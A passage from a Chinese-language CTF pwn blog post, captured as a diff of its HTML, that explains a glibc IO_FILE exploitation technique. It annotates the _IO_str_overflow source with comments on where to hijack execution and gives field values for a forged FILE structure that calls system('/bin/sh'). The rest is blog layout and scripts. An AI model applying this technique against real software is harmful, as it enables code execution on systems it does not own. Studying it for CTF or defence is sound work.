+     <span class="token comment">/* not allowed to enlarge */</span> <span class="token comment">// pass</span>
+     <span class="token comment">//需要为假</span>
+          
+    <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+      <span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token keyword">char</span> <span class="token operator">*</span>new_buf<span class="token punctuation">;</span>
+      <span class="token keyword">char</span> <span class="token operator">*</span>old_buf <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>
+      <span class="token class-name">size_t</span> old_blen <span class="token operator">=</span> <span class="token function">_IO_blen</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      _IO_size_t new_size <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> old_blen <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">;</span><span class="token comment">//指向/bin/sh字符串对应的地址</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>new_size <span class="token operator">&lt;</span> old_blen<span class="token punctuation">)</span><span class="token comment">//pass 一般会通过</span>
+        <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+      new_buf
+        <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_strfile <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token operator">-></span>_s<span class="token punctuation">.</span>_allocate_buffer<span class="token punctuation">)</span> <span class="token punctuation">(</span>new_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token comment">//最终要劫持至该位置</span>
+          <span class="token comment">//target [fp+0xe0]==》指向system地址</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>new_buf <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+          <span class="token comment">/*      __ferror(fp) = 1; */</span>
+          <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>old_buf<span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+          <span class="token function">memcpy</span> <span class="token punctuation">(</span>new_buf<span class="token punctuation">,</span> old_buf<span class="token punctuation">,</span> old_blen<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_strfile <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token operator">-></span>_s<span class="token punctuation">.</span>_free_buffer<span class="token punctuation">)</span> <span class="token punctuation">(</span>old_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span>
+          fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token function">memset</span> <span class="token punctuation">(</span>new_buf <span class="token operator">+</span> old_blen<span class="token punctuation">,</span> <span class="token char">'\0'</span><span class="token punctuation">,</span> new_size <span class="token operator">-</span> old_blen<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+      <span class="token function">_IO_setb</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> new_buf<span class="token punctuation">,</span> new_buf <span class="token operator">+</span> new_size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      fp<span class="token operator">-></span>_IO_read_base <span class="token operator">=</span> new_buf <span class="token operator">+</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_base <span class="token operator">-</span> old_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">=</span> new_buf <span class="token operator">+</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">-</span> old_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      fp<span class="token operator">-></span>_IO_read_end <span class="token operator">=</span> new_buf <span class="token operator">+</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_end <span class="token operator">-</span> old_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> new_buf <span class="token operator">+</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> old_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+      fp<span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> new_buf<span class="token punctuation">;</span>
+      fp<span class="token operator">-></span>_IO_write_end <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_end<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flush_only<span class="token punctuation">)</span>
+    <span class="token operator">*</span>fp<span class="token operator">-></span>_IO_write_ptr<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> c<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">)</span>
+    fp<span class="token operator">-></span>_IO_read_end <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">;</span>
+  <span class="token keyword">return</span> c<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>_IO_str_overflow<span class="token punctuation">)</span></code></pre>
+
+<p>&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c">fp<span class="token operator">-></span>_flags<span class="token operator">=</span><span class="token number">0</span>
+fp<span class="token operator">-></span>_IO_buf_base<span class="token operator">=</span><span class="token number">0</span>
+fp<span class="token operator">-></span>_IO_buf_end<span class="token operator">=</span><span class="token punctuation">(</span>bin_sh_addr <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span>
+fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">=</span> <span class="token operator">/</span>bin<span class="token operator">/</span>sh_addr
+fp <span class="token operator">+</span> <span class="token number">0xe8</span> <span class="token operator">=</span> system_addr</code></pre>
+
+
+
+<h3 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h3><p>IO_FILE必须要libc的低32位为负时才能利用成功</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Closure</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2022/03/15/IO-FILE/">http://example.com/2022/03/15/IO-FILE/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Closure</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/IO-FILE/">
+                                    <span class="chip bg-color">IO_FILE</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/03/17/Tcache-attack/">
+                    <div class="card-image">
+                        
+                        <img src="https://raw.githubusercontent.com/zh-Closure/images/main/202207191750746.jpg" class="responsive-img" alt="Tcache attack">
+                        
+                        <span class="card-title">Tcache attack</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-17
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Closure
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn-%E5%A0%86/">
+                        <span class="chip bg-color">pwn_堆</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/14/Large-bin-attack/">
+                    <div class="card-image">
+                        
+                        <img src="https://raw.githubusercontent.com/zh-Closure/images/main/202207191742632.jpg" class="responsive-img" alt="Large bin attack">
+                        
+                        <span class="card-title">Large bin attack</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Closure
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn-%E5%A0%86/">
+                        <span class="chip bg-color">pwn_堆</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4, h5, h6'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4, h5, h6').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022</span>
+            
+            <a href="/about" target="_blank">Closure</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/zh-closure" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2022";
+                        var startMonth = "3";
+                        var startDate = "1";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/zh-Closure" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:765003952@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=765003952" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 765003952" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
